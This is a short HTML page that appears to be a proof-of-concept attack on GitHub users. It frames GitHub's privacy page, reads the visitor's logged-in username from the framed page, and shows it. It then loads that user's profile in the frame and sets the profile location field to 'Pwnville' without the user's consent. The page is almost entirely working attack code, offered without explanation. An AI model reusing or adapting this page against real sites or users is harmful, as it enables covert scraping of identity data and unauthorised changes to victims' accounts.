<script src="http://jquery.com/src/jquery-latest.js">
</script>

<p>
Your logged-in username is
<span id="scrapedname" style="color:red; font-weight:bold" >n/a</span>
</p>

<hr/>

<iframe width=100% height=300 id="inner" src="http://github.com/site/privacy"></iframe>

<script>

function getName() {
   return jQuery.trim($(document.getElementById('inner').contentWindow.document).find('.name').text());
}

function frameLoaded() {
   alert('frameLoaded');
   var currName = getName();
   $('#scrapedname').text(currName.length>0?currName:"n/a");
   if (!currName) return;

   var frame = document.getElementById('inner');
   var userProfilePage = "http://github.com/"+currName;
   if(frame.src != userProfilePage) {
     frame.src = userProfilePage;
   } else {
     $(frame.contentWindow.document).find('#profile_location').click().find('input').val('Pwnville').blur();
   }
}

$(function() {
  $('#inner').load( frameLoaded );
});

</script>
